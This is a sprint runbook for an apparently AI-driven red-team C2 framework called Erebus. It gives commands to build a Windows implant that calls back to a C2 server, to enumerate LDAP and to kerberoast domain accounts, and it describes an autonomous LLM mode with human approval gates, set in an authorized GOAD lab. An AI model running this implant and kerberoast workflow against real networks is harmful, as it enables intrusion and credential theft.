# Golden Demo Runbook (Sprint 1)

**Status:** Eng ready post-P0 RTT; requires GOAD (or equivalent) domain lab.  
**Frozen objective:**

> From the current session on the domain-joined host, recon the box, enumerate domain LDAP for kerberoastable principals, kerberoast candidates if found, and summarize. Do not dump LSASS, install persistence, or move laterally.

**Success:** 5 consecutive Auto runs complete with `mission_complete` (or clear summary) and at least one successful `ldap_enum` after approval.

---

## Lab checklist (fill before first run)

| Item | Value |
|------|--------|
| Domain FQDN | e.g. `sevenkingdoms.local` |
| DC hostname | e.g. `kingslanding.sevenkingdoms.local` |
| Domain user for bind (if needed) | |
| C2 listener URL | `https://<teamserver>:443` (reachable from implant host) |
| Implant host | Domain-joined Windows workstation |
| Operator machine | Teamserver + `erebus` CLI |
| LLM | Hosted Claude/GPT recommended (`ai provider …` / `ai key …`) |

---

## One-time setup

```bash
# On operator machine
cd /path/to/Erebus
make erebus install   # or: make erebus && ./build/erebus

erebus serve          # teamserver + certs under ~/.erebus/certs/
# Separate terminal:
cp config/agent.yaml.example ~/.erebus/agent.yaml   # optional
# Ensure approver.pem exists (created by serve)
```

### Build Windows implant (interactive sleep)

```bash
# From operator REPL after serve:
generate --os windows --arch amd64 --sleep 500 --jitter 10 \
  --callback https://YOUR_C2:443 --out ./implant.exe

# Or make:
make implant-win CALLBACK_URL=https://YOUR_C2:443 SLEEP_MS=500 JITTER_PCT=10
```

Copy `implant.exe` to domain host and run (authorized lab only).

---

## Manual path (prove once before Auto)

```text
erebus operator
sessions
use <session-id>
shell whoami
ifconfig
ldap-enum kerberoastable --domain <DOMAIN> --dc <DC>
# second cert / dual-control: approve when pending
pending
approve <id>
kerberoast --domain <DOMAIN> --dc <DC> --user <u> --pass <p>   # as required
loot
```

If any step fails, capture error text before Auto.

---

## AI path (Plan → Auto)

```text
erebus
erebus › ai

# Shift+Tab until Plan is active
# Paste frozen objective, wait for structured plan (no implant tasks)

# Shift+Tab to Auto
# Paste same objective (or refined plan)
# When APPROVAL banner appears: [a] approve or [d] deny
# Expect: recon → ldap_enum → kerberoast → mission_complete
```

Keys:

| Key | Action |
|-----|--------|
| Tab | Model picker |
| Shift+Tab | Normal / Plan / Auto |
| `a` / `d` | Approve / deny high-risk |
| `/clear` | Reset transcript |
| `/back` | Leave TUI |

---

## Demo video beats (~6–8 min)

1. Banner + `erebus serve` / session appears  
2. Plan mode → structured path  
3. Auto → recon tools stream  
4. Approval modal → press **a**  
5. LDAP results + suggestions  
6. Second approve if kerberoast  
7. `mission_complete` summary  

---

## 5× evaluation log

Use `scripts/golden_ad_eval.md` checklist. Record pass/fail per run.

| Run | Date | Model | Pass? | Notes |
|-----|------|-------|-------|-------|
| 1 | | | | |
| 2 | | | | |
| 3 | | | | |
| 4 | | | | |
| 5 | | | | |

---

## Failure triage

| Symptom | Check |
|---------|--------|
| Auto unavailable | `~/.erebus/certs/operator.pem` + `approver.pem`; teamserver up |
| Task slow again | Implant sleep; server should not force 5s (P0 fix) |
| LDAP fail | Domain/DC names; network from implant to DC:389/88 |
| Approval hang | Approver cert present; press `a` not second terminal |
| LLM loops | Hosted strong model; `/clear` and restate objective |

---

## Related

- Sprint 2: creds + lateral + memory (`docs/AD_ENGAGEMENT.md` when added)  
- Lab perf: `go test ./server/e2e/ -run TestLabPerf -v`  
- Smoke: `bash scripts/smoke_test.sh`
